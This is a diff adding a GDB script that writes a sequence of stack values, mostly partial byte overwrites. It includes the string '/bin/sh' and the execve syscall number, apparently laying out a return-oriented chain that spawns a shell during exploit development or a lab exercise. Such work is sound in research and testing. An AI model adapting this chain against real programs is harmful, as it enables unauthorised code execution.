@@ -1,0 +1,62 @@
+
+#1
+set *(unsigned long*)($rsp)=0x0000000000000000 
+#2
+set *(unsigned long*)($rsp+0x18)=0x0000000000000021
+set *(unsigned char*)($rsp+0x48)=0xE2
+#3
+set *(unsigned char*)($rsp+0x98)=0x4D
+##through thread itself:
+#4
+set *(unsigned long*)($rsp+0xA0)=0x0000000000000000 
+set *(unsigned char*)($rsp+0xB8)=0x4D
+#5
+set *(unsigned char*)($rsp+0xC8)=0xB0
+#6
+set *(unsigned char*)($rsp+0xE8)=0x6B
+#7
+set *(unsigned char*)($rsp+0xF8)=0x55
+#8
+set *(unsigned long*)($rsp+0x100)=0x000000000000001B
+set *(unsigned char*)($rsp+0x108)=0x4B
+#9
+set *(unsigned char*)($rsp+0x118)=0xB0
+#10
+set *(unsigned char*)($rsp+0x138)=0x6B
+#11
+set *(unsigned char*)($rsp+0x148)=0x95
+#12
+# set r12
+set *(unsigned long*)($rsp+0x188)=0x0000000000000000
+set *(unsigned char*)($rsp+0x1A8)=0xB0
+#13
+set *(unsigned char*)($rsp+0x1C8)=0x6B
+#14
+set *(unsigned char*)($rsp+0x1D8)=0x55
+#15
+set *(unsigned char*)($rsp+0x1E8)=0x5C
+#16
+set *(unsigned char*)($rsp+0x1F8)=0xB0
+#17
+# set $rbp
+set *(unsigned long*)($rsp+0x210)=0x0000000000000000
+set *(unsigned char*)($rsp+0x218)=0x6B
+#18
+set *(unsigned char*)($rsp+0x228)=0x95
+#19
+set *(unsigned long*)($rsp+0x230)=0x0068732F6e69622F
+set *(unsigned long*)($rsp+0x280)=0x000000000000003B
+set *(unsigned char*)($rsp+0x288)=0x5C
+#20
+set *(unsigned char*)($rsp+0x298)=0xB0
+#21
+set *(unsigned char*)($rsp+0x2B8)=0x07
+#22
+set *(unsigned char*)($rsp+0x2E8)=0xB0
+#23
+set *(unsigned char*)($rsp+0x308)=0x6B
+#24
+set *(unsigned char*)($rsp+0x318)=0x40
+#25
+set *(unsigned long*)($rsp+0x328)=0x0000000000000000
+set *(unsigned char*)($rsp+0x378)=0x2E
